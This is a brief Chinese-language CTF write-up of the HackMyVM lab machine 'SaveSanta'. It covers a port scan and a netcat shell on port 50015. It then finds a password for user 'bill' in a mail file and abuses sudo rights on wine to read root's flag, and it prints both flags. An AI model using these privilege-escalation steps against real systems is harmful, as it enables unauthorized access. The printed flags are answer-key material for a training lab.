# SaveSanta

2025.03.27 https://hackmyvm.eu/machines/machine.php?vm=SaveSanta

[video]()

## Ip

192.168.5.40

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
50015/tcp open  unknown
```

先没看 80 web。

nc 连接 50015 发现是一个 shell，可以直接读取 user flag：

```
HMV{f3fda86e428ccda3e33d207217665201}
```

系统枚举，啥都没有，最后在 /var/mail/alabaster 发现邮件：

```
Dear Alabaster,
As you know our systems have been compromised. You have been assigned to restore all systems as soon as possible.
I heard you have kicked out the Naughty Elfs so they cannot come back into the system. To be more secure we have hired Bill Gates.
His account has been created and ready to logon. When Bill arrives, tell him his username is 'bill'. The password has been set to: 'JingleBellsPhishingSmellsHackersGoAway' He will know what to do next.
Please help Bill as much as possible so Christmas can go on!
- Santa
```

bill:JingleBellsPhishingSmellsHackersGoAway 切换后，sudo -l 显示 (ALL) NOPASSWD: /usr/bin/wine 发现执行的是这个脚本/usr/bin/wine-stable 查看其内容，发现可以直接执行命令：

```
sudo /usr/bin/wine cmd /c dir   # 发现在Z:\
sudo /usr/bin/wine cmd /c dir Z:\\root
sudo /usr/bin/wine cmd /c type Z:/root/root.txt
HMV{67df9276f8aaa3f9f50b3e41fe5cbc53}
```
